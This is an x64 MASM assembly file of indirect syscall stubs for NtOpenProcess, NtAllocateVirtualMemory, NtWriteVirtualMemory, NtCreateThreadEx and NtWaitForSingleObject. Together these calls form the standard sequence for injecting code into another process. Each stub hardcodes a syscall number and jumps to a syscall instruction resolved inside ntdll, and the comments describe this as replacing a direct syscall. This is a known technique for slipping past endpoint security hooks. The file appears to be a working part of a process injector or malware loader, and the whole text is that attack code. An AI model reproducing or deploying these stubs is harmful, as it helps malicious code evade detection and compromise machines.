EXTERN syscallAddress_CreateThreadEx:QWORD
EXTERN syscallAddress_AllocateVirtualMemory:QWORD
EXTERN syscallAddress_NtOpenProcess:QWORD
EXTERN syscallAddress_NtWriteVirtualMemory:QWORD
EXTERN syscallAddress_NtWaitForSingleObject:QWORD

.code

my_asm_NTCreateThreadex proc
	mov     r10, rcx        ; NtCreateThreadEx
	mov     eax, 0C9h
	
	jmp qword ptr [syscallAddress_CreateThreadEx]
	
	
	;syscall                 ; Low latency system call
	ret

my_asm_NTCreateThreadex endp   



my_asm_NtAllocateVirtualMemory proc
	mov     r10, rcx        ; NtAllocateVirtualMemory
	mov     eax, 18h
	; direct syscall, execute the syscall
	;syscall              

	; indirect syscall, instead of execute the syscall, we jump on the syscall in the ntdll
	; we resolved this address, previously, in [syscallAddress_AllocateVirtualMemory]
	jmp qword ptr [syscallAddress_AllocateVirtualMemory]
	ret
my_asm_NtAllocateVirtualMemory endp



my_asm_NtOpenProcess proc
	mov     r10, rcx        ; NtOpenProcess
	mov     eax, 26h 
	jmp qword ptr [syscallAddress_NtOpenProcess]
	ret
my_asm_NtOpenProcess endp



my_asm_NtWriteVirtualMemory proc
	mov     r10, rcx        ; NtWriteVirtualMemory
	mov     eax, 3Ah
	jmp qword ptr [syscallAddress_NtWriteVirtualMemory]
	ret
my_asm_NtWriteVirtualMemory endp



my_asm_NtWaitForSingleObject proc
	mov     r10, rcx        ; NtWaitForSingleObject
	mov     eax, 4
	jmp qword ptr [syscallAddress_NtWaitForSingleObject]
	ret
my_asm_NtWaitForSingleObject endp

end